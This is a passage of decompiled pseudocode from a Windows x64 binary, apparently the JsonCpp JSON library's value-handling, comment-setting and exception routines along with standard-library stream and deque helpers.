  double v2; // xmm0_8
  double Y; // [rsp+30h] [rbp+8h]

  if ( *(_BYTE *)(a1 + 8) == 1 )
    return 1;
  if ( *(_BYTE *)(a1 + 8) == 2 )
    return *(_QWORD *)a1 <= 0x7FFFFFFFFFFFFFFFui64;
  if ( *(_BYTE *)(a1 + 8) != 3 )
    return 0;
  v2 = *(double *)a1;
  return *(double *)a1 >= (double)0 && (double)-1 > v2 && modf(v2, &Y) == 0.0;
}

//----- (000000014006E8C0) ----------------------------------------------------
bool __fastcall sub_14006E8C0(__int64 a1, _QWORD *a2)
{
  unsigned __int64 v2; // rax
  __int64 v3; // r9
  _QWORD *v4; // r8
  __int64 v5; // rcx

  v2 = a2[3];
  v3 = a1;
  if ( v2 < 0x10 )
    LODWORD(v4) = (_DWORD)a2;
  else
    v4 = (_QWORD *)*a2;
  v5 = a2[2];
  if ( v2 >= 0x10 )
    a2 = (_QWORD *)*a2;
  return sub_14006E230(v3, a2, (signed int)v5 + (signed int)v4) != 0;
}

//----- (000000014006E900) ----------------------------------------------------
bool __fastcall sub_14006E900(__int64 a1)
{
  return *(_BYTE *)(a1 + 8) == 7;
}

//----- (000000014006E910) ----------------------------------------------------
bool __fastcall sub_14006E910(__int64 a1)
{
  return *(_BYTE *)(a1 + 8) == 4;
}

//----- (000000014006E920) ----------------------------------------------------
char __fastcall sub_14006E920(__int64 a1)
{
  double v2; // xmm0_8
  double Y; // [rsp+40h] [rbp+8h]

  if ( *(_BYTE *)(a1 + 8) == 1 )
    return *(_QWORD *)a1 >= 0;
  if ( *(_BYTE *)(a1 + 8) == 2 )
    return 1;
  if ( *(_BYTE *)(a1 + 8) != 3 )
    return 0;
  v2 = *(double *)a1;
  return *(double *)a1 >= 0.0 && v2 < 1.844674407370955e19 && modf(v2, &Y) == 0.0;
}

//----- (000000014006E9A0) ----------------------------------------------------
bool __fastcall sub_14006E9A0(__int64 a1)
{
  double v2; // xmm0_8
  double Y; // [rsp+40h] [rbp+8h]

  if ( *(_BYTE *)(a1 + 8) == 1 )
    return *(_QWORD *)a1 >= 0i64 && *(_QWORD *)a1 <= 0xFFFFFFFFui64;
  if ( *(_BYTE *)(a1 + 8) == 2 )
    return *(_QWORD *)a1 <= 0xFFFFFFFFui64;
  if ( *(_BYTE *)(a1 + 8) != 3 )
    return 0;
  v2 = *(double *)a1;
  return *(double *)a1 >= 0.0 && v2 <= 4294967295.0 && modf(v2, &Y) == 0.0;
}

//----- (000000014006EA40) ----------------------------------------------------
void __fastcall sub_14006EA40(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  _QWORD *v3; // rdi
  unsigned __int64 v4; // rax
  unsigned __int64 v5; // rcx
  unsigned __int64 v6; // rbx
  _QWORD *v7; // rbx
  _QWORD *v8; // rsi
  _QWORD *v9; // rsi

  v2 = a2;
  v3 = a1;
  v4 = a1[1];
  if ( (unsigned __int64)a2 >= v4 || (v5 = *a1, v5 > (unsigned __int64)a2) )
  {
    if ( v4 == v3[2] )
      sub_14006CC80((__int64)v3, 1ui64);
    v9 = (_QWORD *)v3[1];
    if ( v9 )
    {
      v9[3] = 15i64;
      v9[2] = 0i64;
      *(_BYTE *)v9 = 0;
      if ( v2[3] >= 0x10ui64 )
      {
        *v9 = *v2;
        *v2 = 0i64;
      }
      else if ( v2[2] != -1i64 )
      {
        memmove(v9, v2, v2[2] + 1i64);
      }
      v9[2] = v2[2];
      v9[3] = v2[3];
      v2[3] = 15i64;
      v2[2] = 0i64;
      *(_BYTE *)v2 = 0;
    }
  }
  else
  {
    v6 = (unsigned __int64)a2 - v5;
    if ( v4 == v3[2] )
      sub_14006CC80((__int64)v3, 1ui64);
    v7 = (_QWORD *)(*v3 + (v6 & 0xFFFFFFFFFFFFFFE0ui64));
    v8 = (_QWORD *)v3[1];
    if ( v8 )
    {
      v8[3] = 15i64;
      v8[2] = 0i64;
      *(_BYTE *)v8 = 0;
      if ( v7[3] >= 0x10ui64 )
      {
        *v8 = *v7;
        *v7 = 0i64;
      }
      else if ( v7[2] != -1i64 )
      {
        memmove(v8, v7, v7[2] + 1i64);
      }
      v8[2] = v7[2];
      v8[3] = v7[3];
      v7[3] = 15i64;
      v7[2] = 0i64;
      *(_BYTE *)v7 = 0;
    }
  }
  v3[1] += 32i64;
}

//----- (000000014006EB90) ----------------------------------------------------
signed __int64 __fastcall sub_14006EB90(__int64 a1, _QWORD *a2, int a3)
{
  int v3; // edi
  _QWORD *v4; // rsi
  void ****v5; // r15
  char v6; // al
  _QWORD *v7; // rax
  _QWORD *v8; // rax
  _QWORD *v9; // rbx
  __int64 v10; // rax
  unsigned int v11; // edi
  void ***v12; // rax
  void **v13; // r13
  _QWORD *v14; // rbx
  const void *v15; // rcx
  bool v16; // cf
  unsigned int v17; // er14
  int *v18; // rax
  int v19; // eax
  const void *v20; // rcx
  bool v21; // zf
  unsigned int v22; // edx
  int v24; // er14
  _BYTE *v25; // rax
  unsigned __int8 v26; // r12
  void ***v27; // rbx
  _QWORD *v28; // rax
  void ***v29; // rbx
  unsigned int v30; // [rsp+30h] [rbp-A8h]
  int v31[2]; // [rsp+38h] [rbp-A0h]
  unsigned int v32; // [rsp+40h] [rbp-98h]
  void ****v33; // [rsp+48h] [rbp-90h]
  void *Memory; // [rsp+50h] [rbp-88h]
  signed int *v35; // [rsp+58h] [rbp-80h]
  char v36; // [rsp+60h] [rbp-78h]
  __int64 v37; // [rsp+78h] [rbp-60h]
  char v38; // [rsp+E0h] [rbp+8h]
  _QWORD *v39; // [rsp+148h] [rbp+70h]
  unsigned int v40; // [rsp+150h] [rbp+78h]
  __int64 v41; // [rsp+158h] [rbp+80h]

  v37 = -2i64;
  v3 = a3;
  v4 = a2;
  v5 = (void ****)a1;
  v33 = (void ****)a1;
  v30 = 0;
  v6 = *(_BYTE *)(a1 + 8);
  if ( !v6 )
    goto LABEL_48;
  if ( v6 != 7 )
  {
    v35 = (signed int *)&unk_1400AE528;
    std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(&v38);
    v30 = 1;
    std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v35, &v36, 0i64, 0i64);
    *(signed int **)((char *)&v35 + v35[1]) = (signed int *)&off_1400AE520;
    *(_DWORD *)((char *)&v37 + v35[1] + 4) = v35[1] - 136;
    sub_140022FE0((__int64)&v36, 2);
    sub_14006AC80(&v35, "in Json::Value::resolveReference(key, end): requires objectValue");
    v7 = sub_14006F1C0((__int64)&v35, &v39);
    sub_14006F240(v7);
  }
  if ( !v6 )
  {
LABEL_48:
    v40 = v40 & 0xFFFFFE07 | 7;
    v41 = 0i64;
    v8 = operator new(0x10ui64);
    v9 = v8;
    *(_QWORD *)v31 = v8;
    if ( v8 )
    {
      *v8 = 0i64;
      v8[1] = 0i64;
      sub_14006C9C0();
      *v9 = v10;
    }
    else
    {
      v9 = 0i64;
    }
    v39 = v9;
    sub_14006BFB0((__int64)v5);
    sub_14006BF10((__int64)&v39);
  }
  v39 = v4;
  v11 = 4 * (v3 - (_DWORD)v4) & 0xFFFFFFFE | 2;
  v40 = v11;
  v12 = *v5;
  *(_QWORD *)v31 = v12;
  v13 = *v12;
  v14 = (*v12)[1];
  if ( !*((_BYTE *)v14 + 25) )
  {
    while ( 1 )
    {
      v15 = (const void *)v14[4];
      if ( !v15 )
        break;
      v17 = *((_DWORD *)v14 + 10) >> 2;
      v32 = v17;
      v30 = v11 >> 2;
      v18 = (int *)&v30;
      if ( v11 >> 2 >= v17 )
        v18 = (int *)&v32;
      v19 = memcmp(v15, v4, (unsigned int)*v18);
      if ( v19 < 0 )
      {
LABEL_19:
        v14 = (_QWORD *)v14[2];
        goto LABEL_20;
      }
      if ( v19 <= 0 )
      {
        v16 = v17 < v11 >> 2;
LABEL_17:
        if ( v16 )
          goto LABEL_19;
      }
      v13 = (void **)v14;
      v14 = (_QWORD *)*v14;
LABEL_20:
      if ( *((_BYTE *)v14 + 25) )
      {
        v5 = v33;
        v12 = *(void ****)v31;
        goto LABEL_22;
      }
    }
    v16 = *((_DWORD *)v14 + 10) < v11;
    goto LABEL_17;
  }
LABEL_22:
  if ( v13 == *v12 )
    goto LABEL_32;
  v20 = v13[4];
  if ( v20 )
  {
    v22 = *((_DWORD *)v13 + 10) >> 2;
    if ( v22 != v11 >> 2 )
      goto LABEL_32;
    v21 = memcmp(v20, v4, v22) == 0;
  }
  else
  {
    v21 = *((_DWORD *)v13 + 10) == v11;
  }
  if ( v21 )
  {
    if ( v4 )
    {
      if ( (v11 & 3) == 1 )
        free(v4);
    }
    return (signed __int64)(v13 + 6);
  }
LABEL_32:
  v24 = v11 & 3;
  if ( v11 & 3 && v4 )
    v25 = sub_14006DC70(v4, (unsigned __int64)v11 >> 2);
  else
    v25 = v4;
  Memory = v25;
  if ( v4 )
    v26 = v24 != 0;
  else
    v26 = v11 & 3;
  LODWORD(v35) = v11 ^ ((unsigned __int8)v11 ^ v26) & 3;
  sub_14006BAD0(&v36);
  v27 = *v5;
  v28 = sub_14006AE50(*v5, (__int64)&Memory);
  sub_14006B2E0(v31, v27, v13, (__int64)(v28 + 4), (__int64)v28);
  v29 = *(void ****)v31;
  sub_14006BF10((__int64)&v36);
  if ( Memory && ((unsigned __int8)v35 & 3) == 1 )
    free(Memory);
  if ( v4 && v24 == 1 )
    free(v4);
  return (signed __int64)(v29 + 6);
}
// 14006AC80: using guessed type __int64 __fastcall sub_14006AC80(_QWORD, _QWORD);
// 14006BAD0: using guessed type __int64 __fastcall sub_14006BAD0(_QWORD);
// 1400A14F8: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(_QWORD);
// 1400AE520: using guessed type __int64 (__fastcall *off_1400AE520)();
// 1400DBD78: using guessed type __int64 qword_1400DBD78;

//----- (000000014006EED0) ----------------------------------------------------
_BYTE *__fastcall sub_14006EED0(void **a1, _BYTE *a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rsi
  _BYTE *v4; // rbx
  void **v5; // rdi
  void *v6; // rcx
  _QWORD *v7; // rax
  _BYTE *result; // rax
  __int64 v9; // [rsp+28h] [rbp-140h]
  signed int *v10; // [rsp+30h] [rbp-138h]
  char v11; // [rsp+38h] [rbp-130h]
  char v12; // [rsp+B8h] [rbp-B0h]
  char Dst; // [rsp+120h] [rbp-48h]
  __int64 v14; // [rsp+130h] [rbp-38h]
  __int64 v15; // [rsp+138h] [rbp-30h]

  v9 = -2i64;
  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = *a1;
  if ( v6 )
  {
    free(v6);
    *v5 = 0i64;
  }
  if ( !v4 )
  {
    v15 = 15i64;
    v14 = 0i64;
    Dst = 0;
    sub_140004F20(&Dst, "assert json failed", 0x12ui64);
    sub_14006F240(&Dst);
  }
  if ( *v4 && *v4 != 47 )
  {
    v10 = (signed int *)&unk_1400AE528;
    std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(&v12);
    std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v10, &v11, 0i64, 0i64);
    *(signed int **)((char *)&v10 + v10[1]) = (signed int *)&off_1400AE520;
    *(_DWORD *)((char *)&v9 + v10[1] + 4) = v10[1] - 136;
    sub_140022FE0((__int64)&v11, 2);
    sub_14006AC80(&v10, "in Json::Value::setComment(): Comments must start with /");
    v7 = sub_14006F1C0((__int64)&v10, &Dst);
    sub_14006F240(v7);
  }
  result = sub_14006DC70(v4, v3);
  *v5 = result;
  return result;
}
// 14006AC80: using guessed type __int64 __fastcall sub_14006AC80(_QWORD, _QWORD);
// 1400A14F8: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(_QWORD);
// 1400AE520: using guessed type __int64 (__fastcall *off_1400AE520)();

//----- (000000014006F040) ----------------------------------------------------
_BYTE *__fastcall sub_14006F040(__int64 a1, __int64 *a2, int a3)
{
  unsigned __int64 v3; // rax

  v3 = a2[2];
  if ( (unsigned __int64)a2[3] >= 0x10 )
    a2 = (__int64 *)*a2;
  return sub_14006F060(a1, a2, v3, a3);
}

//----- (000000014006F060) ----------------------------------------------------
_BYTE *__fastcall sub_14006F060(__int64 a1, _BYTE *a2, unsigned __int64 a3, int a4)
{
  __int64 v4; // r14
  unsigned __int64 v5; // rbx
  _BYTE *v6; // rbp
  __int64 v7; // rsi
  _DWORD *v8; // rax
  signed __int64 v9; // rdi

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( !*(_QWORD *)(a1 + 16) )
  {
    v8 = operator new(0x20ui64);
    if ( v8 )
    {
      *v8 = 3;
      v9 = (signed __int64)(v8 + 2);
      `eh vector constructor iterator'(v8 + 2, 8ui64, 3, unknown_libname_6, (void (__stdcall *)(void *))sub_14006BEB0);
    }
    else
    {
      v9 = 0i64;
    }
    *(_QWORD *)(v7 + 16) = v9;
  }
  if ( v5 && v6[v5 - 1] == 10 )
    --v5;
  return sub_14006EED0((void **)(*(_QWORD *)(v7 + 16) + 8 * v4), v6, v5);
}

//----- (000000014006F110) ----------------------------------------------------
__int64 __fastcall sub_14006F110(char *a1)
{
  signed int v1; // eax
  __int64 *v3; // rax
  __int64 *v4; // rcx
  __int64 v5; // rax
  __int64 v6; // rcx
  __int64 *i; // rdx

  v1 = a1[8];
  if ( v1 < 0 || v1 <= 5 )
    return 0i64;
  if ( v1 != 6 )
  {
    if ( v1 == 7 )
      return *(unsigned int *)(*(_QWORD *)a1 + 8i64);
    return 0i64;
  }
  if ( !*(_QWORD *)(*(_QWORD *)a1 + 8i64) )
    return 0i64;
  v3 = **(__int64 ***)a1;
  if ( *((_BYTE *)v3 + 25) )
    return (unsigned int)(*(_DWORD *)(v3[2] + 40) + 1);
  v4 = (__int64 *)*v3;
  if ( *(_BYTE *)(*v3 + 25) )
  {
    for ( i = (__int64 *)v3[1]; !*((_BYTE *)i + 25); i = (__int64 *)i[1] )
    {
      if ( v3 != (__int64 *)*i )
        break;
      v3 = i;
    }
    v4 = v3;
    if ( !*((_BYTE *)v3 + 25) )
      v4 = i;
    return (unsigned int)(*((_DWORD *)v4 + 10) + 1);
  }
  v5 = v4[2];
  if ( *(_BYTE *)(v5 + 25) )
    return (unsigned int)(*((_DWORD *)v4 + 10) + 1);
  do
  {
    v6 = v5;
    v5 = *(_QWORD *)(v5 + 16);
  }
  while ( !*(_BYTE *)(v5 + 25) );
  return (unsigned int)(*(_DWORD *)(v6 + 40) + 1);
}

//----- (000000014006F1C0) ----------------------------------------------------
_QWORD *__fastcall sub_14006F1C0(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx

  v2 = a2;
  sub_140029EE0(a1 + 8, a2);
  return v2;
}

//----- (000000014006F1F0) ----------------------------------------------------
__int64 __fastcall sub_14006F1F0(__int64 *a1, __int64 *a2)
{
  char v2; // r8
  __int64 v3; // rax
  int v4; // er9
  __int64 result; // rax

  v2 = *((_BYTE *)a1 + 8);
  *((_BYTE *)a1 + 8) = *((_BYTE *)a2 + 8);
  *((_BYTE *)a2 + 8) = v2;
  v3 = *a1;
  *a1 = *a2;
  *a2 = v3;
  v4 = (*((_WORD *)a1 + 4) >> 8) & 1;
  result = *((_DWORD *)a1 + 2) ^ (*((_DWORD *)a2 + 2) ^ *((_DWORD *)a1 + 2)) & 0x100u;
  *((_DWORD *)a1 + 2) = result;
  *((_DWORD *)a2 + 2) &= 0xFFFFFEFF;
  *((_DWORD *)a2 + 2) |= v4 << 8;
  return result;
}

//----- (000000014006F240) ----------------------------------------------------
void __fastcall sub_14006F240(_QWORD *a1)
{
  _QWORD *v1; // rbx
  __int64 (__fastcall **v2)(void *); // [rsp+28h] [rbp-40h]
  char Dst; // [rsp+40h] [rbp-28h]
  __int64 v4; // [rsp+50h] [rbp-18h]
  __int64 v5; // [rsp+58h] [rbp-10h]

  v1 = a1;
  std::exception::exception((std::exception *)&v2);
  v2 = &off_1400AE4C0;
  v5 = 15i64;
  v4 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, v1, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v2 = &off_1400AE4C0;
  CxxThrowException(&v2, &_TI3_AVLogicError_Json__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400AE4C0: using guessed type __int64 (__fastcall *off_1400AE4C0)(void *);
// 1400D46C0: using guessed type int _TI3_AVLogicError_Json__;

//----- (000000014006F2C0) ----------------------------------------------------
void __fastcall sub_14006F2C0(_QWORD *a1)
{
  _QWORD *v1; // rbx
  __int64 (__fastcall **v2)(void *); // [rsp+28h] [rbp-40h]
  char Dst; // [rsp+40h] [rbp-28h]
  __int64 v4; // [rsp+50h] [rbp-18h]
  __int64 v5; // [rsp+58h] [rbp-10h]

  v1 = a1;
  std::exception::exception((std::exception *)&v2);
  v2 = &off_1400AE4C0;
  v5 = 15i64;
  v4 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, v1, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v2 = &off_1400AE4C0;
  CxxThrowException(&v2, &_TI3_AVRuntimeError_Json__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400AE4C0: using guessed type __int64 (__fastcall *off_1400AE4C0)(void *);
// 1400D4630: using guessed type int _TI3_AVRuntimeError_Json__;

//----- (000000014006F350) ----------------------------------------------------
_QWORD *__fastcall sub_14006F350(__int64 a1)
{
  _QWORD *result; // rax

  result = (_QWORD *)(a1 + 24);
  if ( *(_QWORD *)(a1 + 48) >= 0x10ui64 )
    result = (_QWORD *)*result;
  return result;
}

//----- (000000014006F360) ----------------------------------------------------
__int64 __fastcall sub_14006F360(_QWORD *a1)
{
  _QWORD *v1; // rbx
  __int64 v2; // rax
  signed __int64 v3; // r8
  signed __int64 v4; // rdi
  void *v5; // rcx
  __int64 result; // rax
  __int64 v7; // rcx

  v1 = a1;
  if ( a1[2] <= (unsigned __int64)(a1[4] + 1i64) )
    sub_14006F660(a1, 1ui64);
  v2 = v1[1];
  v3 = v1[2] - 1i64;
  v1[3] &= v3;
  v4 = 8 * (v3 & (v1[4] + v1[3]));
  if ( !*(_QWORD *)(v4 + v2) )
  {
    v5 = operator new(0x40ui64);
    if ( !v5 )
    {
      std::_Xbad_alloc();
      __debugbreak();
    }
    *(_QWORD *)(v4 + v1[1]) = v5;
  }
  result = v1[1];
  v7 = *(_QWORD *)(v4 + result);
  if ( v7 )
  {
    *(_QWORD *)(v7 + 48) = 15i64;
    *(_QWORD *)(v7 + 40) = 0i64;
    *(_BYTE *)(v7 + 24) = 0;
  }
  ++v1[4];
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014006F400) ----------------------------------------------------
_QWORD *__fastcall sub_14006F400(_QWORD *a1, _QWORD *a2, char a3)
{
  char v3; // di
  _QWORD *v4; // rbx
  _QWORD *v5; // rsi
  int v6; // er9
  unsigned __int64 v7; // r8

  v3 = a3;
  v4 = a2;
  v5 = a1;
  std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(a1);
  *v5 = &off_1400A6430;
  v6 = 0;
  if ( !(v3 & 1) )
    v6 = 4;
  if ( !(v3 & 2) )
    v6 |= 2u;
  if ( v3 & 8 )
    v6 |= 8u;
  if ( v3 & 4 )
    v6 |= 0x10u;
  v7 = v4[2];
  if ( v4[3] >= 0x10ui64 )
    v4 = (_QWORD *)*v4;
  sub_140029730((__int64)v5, v4, v7, v6);
  return v5;
}
// 1400A16B8: using guessed type __int64 __cdecl std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(_QWORD);
// 1400A6430: using guessed type __int64 (__fastcall *off_1400A6430)(void *);

//----- (000000014006F4A0) ----------------------------------------------------
_QWORD *__fastcall sub_14006F4A0(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _OWORD *v2; // rax
  _QWORD *v3; // rdi
  _OWORD *v4; // rax

  v1 = a1;
  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = 0i64;
  a1[3] = 0i64;
  a1[4] = 0i64;
  v2 = operator new(0x10ui64);
  if ( !v2 )
  {
    std::_Xbad_alloc();
    __debugbreak();
  }
  *v1 = v2;
  *v2 = 0i64;
  *(_QWORD *)*v1 = v1;
  v3 = v1 + 5;
  *v3 = 0i64;
  v3[1] = 0i64;
  v3[2] = 0i64;
  v3[3] = 0i64;
  v3[4] = 0i64;
  v4 = operator new(0x10ui64);
  if ( !v4 )
  {
    std::_Xbad_alloc();
    __debugbreak();
  }
  *v3 = v4;
  *v4 = 0i64;
  *(_QWORD *)*v3 = v3;
  v1[13] = 15i64;
  v1[12] = 0i64;
  *((_BYTE *)v1 + 80) = 0;
  v1[14] = 0i64;
  v1[15] = 0i64;
  v1[16] = 0i64;
  v1[17] = 0i64;
  v1[18] = 0i64;
  v1[22] = 15i64;
  v1[21] = 0i64;
  *((_BYTE *)v1 + 152) = 0;
  *((_WORD *)v1 + 92) = 1;
  *((_BYTE *)v1 + 186) = 0;
  return v1;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014006F5A0) ----------------------------------------------------
void __fastcall sub_14006F5A0(__int64 a1)
{
  struct std::ios_base *v1; // rbx

  v1 = (struct std::ios_base *)(a1 + 144);
  *(_QWORD *)((char *)v1 + *(signed int *)(*(_QWORD *)a1 + 4i64) - 144) = &off_1400AEE38;
  *(_DWORD *)((char *)v1 + *(signed int *)(*(_QWORD *)a1 + 4i64) - 148) = *(_DWORD *)(*(_QWORD *)a1 + 4i64) - 144;
  sub_140023CD0(a1 + 16);
  std::basic_istream<char,std::char_traits<char>>::~basic_istream<char,std::char_traits<char>>((char *)v1 - 120);
  *(_QWORD *)v1 = std::basic_ios<char,std::char_traits<char>>::`vftable';
  *(_QWORD *)v1 = std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400A1640: using guessed type void *std::ios_base::`vftable';
// 1400A1678: using guessed type __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::~basic_istream<char,std::char_traits<char>>(_QWORD);
// 1400A16C0: using guessed type void __stdcall static std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 1400AEE38: using guessed type __int64 (__fastcall *off_1400AEE38)();

//----- (000000014006F614) ----------------------------------------------------
void *__fastcall sub_14006F614(__int64 a1, char a2)
{
  return sub_14006F620(a1 - *(signed int *)(a1 - 4), a2);
}

//----- (000000014006F620) ----------------------------------------------------
void *__fastcall sub_14006F620(__int64 a1, char a2)
{
  void *v2; // rdi
  char v3; // bl

  v2 = (void *)(a1 - 144);
  v3 = a2;
  sub_14006F5A0(a1 - 144);
  if ( v3 & 1 )
    operator delete(v2);
  return v2;
}

//----- (000000014006F660) ----------------------------------------------------
void __fastcall sub_14006F660(_QWORD *a1, unsigned __int64 a2)
{
  __int64 v2; // rdi
  unsigned __int64 v3; // rbx
  _QWORD *v4; // rbp
  unsigned __int64 v5; // rbx
  char *v6; // r14
  unsigned __int64 v7; // rcx
  unsigned __int64 v8; // r15
  signed __int64 v9; // rsi
  size_t v10; // rdi
  char *v11; // rax
  const void *v12; // rdx
  char *v13; // rcx
  char *v14; // rax
  void *v15; // rdi
  unsigned __int64 v16; // rcx
  char *v17; // rax
  void *v18; // rcx

  v2 = a1[2];
  v3 = 1i64;
  v4 = a1;
  if ( v2 )
    v3 = a1[2];
  while ( v3 - v2 < a2 || v3 < 8 )
  {
    if ( 0x3FFFFFFFFFFFFFFi64 - v3 < v3 )
    {
      std::_Xlength_error("deque<T> too long");
      JUMPOUT(*(_QWORD *)&byte_14006F807);
    }
    v3 *= 2i64;
  }
  v5 = v3 - v2;
  v6 = 0i64;
  v7 = v2 + v5;
  v8 = v4[3];
  if ( v2 + v5 )
  {
    if ( v7 > 0x1FFFFFFFFFFFFFFFi64 || (v6 = (char *)operator new(8 * v7)) == 0i64 )
    {
      std::_Xbad_alloc();
      __debugbreak();
    }
  }
  v9 = 8 * v8;
  v10 = 8 * ((signed __int64)(8i64 * v4[2] - 8 * v8) >> 3);
  v11 = (char *)memmove(&v6[8 * v8], (const void *)(8 * v8 + v4[1]), v10);
  v12 = (const void *)v4[1];
  v13 = &v11[v10];
  if ( v8 > v5 )
  {
    memmove(v13, v12, 8 * v5 & 0xFFFFFFFFFFFFFFF8ui64);
    v17 = (char *)memmove(v6, (const void *)(8 * v5 + v4[1]), 8 * ((signed __int64)(v9 - 8 * v5) >> 3))
        + 8 * ((signed __int64)(v9 - 8 * v5) >> 3);
    if ( !v5 )
      goto LABEL_19;
    v15 = v17;
    v16 = v5;
    goto LABEL_18;
  }
  v14 = (char *)memmove(v13, v12, 8 * (v9 >> 3)) + 8 * (v9 >> 3);
  if ( v5 != v8 )
    memset(v14, 0, 8 * (v5 - v8));
  if ( v8 )
  {
    v15 = v6;
    v16 = v8;
LABEL_18:
    memset(v15, 0, 8 * v16);
  }
LABEL_19:
  v18 = (void *)v4[1];
  if ( v18 )
    operator delete(v18);
  v4[2] += v5;
  v4[1] = v6;
}
// 14006F807: using guessed type char;
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014006F810) ----------------------------------------------------
void __fastcall sub_14006F810(__int64 a1, char *a2, char *a3, int a4)
{
  int v4; // ebx
  __int64 v5; // rdi
  void *Src; // [rsp+28h] [rbp-40h]
  unsigned __int64 v7; // [rsp+40h] [rbp-28h]

  v4 = a4;
  v5 = a1;
  sub_140070CF0(&Src, a2, a3);
  if ( v4 == 1 )
    sub_14006F040(*(_QWORD *)(v5 + 144), (__int64 *)&Src, 1);
  else
    sub_140004B80((_QWORD *)(v5 + 152), &Src, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v7 >= 0x10 )
    operator delete(Src);
}

//----- (000000014006F8A0) ----------------------------------------------------
char __fastcall sub_14006F8A0(__int64 a1, void **a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdi
  __int64 v5; // rbx
  __int128 v7; // [rsp+30h] [rbp-68h]
  __int64 v8; // [rsp+40h] [rbp-58h]
  void *Dst; // [rsp+48h] [rbp-50h]
  __int64 v10; // [rsp+58h] [rbp-40h]
  unsigned __int64 v11; // [rsp+60h] [rbp-38h]
  __int64 v12; // [rsp+68h] [rbp-30h]

  v4 = a4;
  v5 = a1;
  v11 = 15i64;
  v10 = 0i64;
  LOBYTE(Dst) = 0;
  v7 = *(_OWORD *)a3;
  v8 = *(_QWORD *)(a3 + 16);
  if ( &Dst != a2 )
    sub_140004DF0(&Dst, a2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v12 = v4;
  sub_140071150((_QWORD *)(v5 + 40), (__int64)&v7);
  if ( v11 >= 0x10 )
    operator delete(Dst);
  return 0;
}

//----- (000000014006FBF0) ----------------------------------------------------
__int64 __fastcall sub_14006FBF0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rbx
  __int64 v5; // rsi
  _BYTE *v6; // r8
  _BYTE *v7; // rdx
  signed int v8; // ST20_4
  const void *v9; // rdx
  __int64 v10; // rax
  _BYTE *v11; // r8
  _BYTE *v12; // rdx
  _QWORD *v13; // rax
  void **v14; // rax
  unsigned __int8 v15; // bl
  double v17; // [rsp+28h] [rbp-D8h]
  __int64 v18; // [rsp+30h] [rbp-D0h]
  __int64 (__fastcall ***v19)(void *); // [rsp+38h] [rbp-C8h]
  signed int *v20; // [rsp+40h] [rbp-C0h]
  __int64 (__fastcall **v21)(void *); // [rsp+50h] [rbp-B0h]
  char v22; // [rsp+58h] [rbp-A8h]
  char v23; // [rsp+D0h] [rbp-30h]
  void *v24; // [rsp+130h] [rbp+30h]
  __int64 v25; // [rsp+140h] [rbp+40h]
  unsigned __int64 v26; // [rsp+148h] [rbp+48h]
  void *Dst; // [rsp+150h] [rbp+50h]
  unsigned __int64 v28; // [rsp+160h] [rbp+60h]
  unsigned __int64 v29; // [rsp+168h] [rbp+68h]
  void *v30; // [rsp+170h] [rbp+70h]
  __int64 v31; // [rsp+180h] [rbp+80h]
  unsigned __int64 v32; // [rsp+188h] [rbp+88h]
  void *v33; // [rsp+190h] [rbp+90h]
  __int64 v34; // [rsp+1A0h] [rbp+A0h]
  unsigned __int64 v35; // [rsp+1A8h] [rbp+A8h]

  v18 = -2i64;
  v3 = a3;
  v4 = a2;
  v5 = a1;
  v17 = 0.0;
  v6 = *(_BYTE **)(a2 + 16);
  v7 = *(_BYTE **)(a2 + 8);
  v29 = 15i64;
  v28 = 0i64;
  LOBYTE(Dst) = 0;
  if ( v7 != v6 )
    sub_140004F20(&Dst, v7, v6 - v7);
  v20 = (signed int *)&unk_1400AEE40;
  std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(&v23);
  v8 = 1;
  std::basic_istream<char,std::char_traits<char>>::basic_istream<char,std::char_traits<char>>(
    &v20,
    &v21,
    0i64,
    0i64,
    v8);
  *(signed int **)((char *)&v20 + v20[1]) = (signed int *)&off_1400AEE38;
  *(_DWORD *)((char *)&v19 + v20[1] + 4) = v20[1] - 144;
  v19 = &v21;
  std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(&v21);
  v21 = &off_1400A6430;
  v9 = &Dst;
  if ( v29 >= 0x10 )
    v9 = Dst;
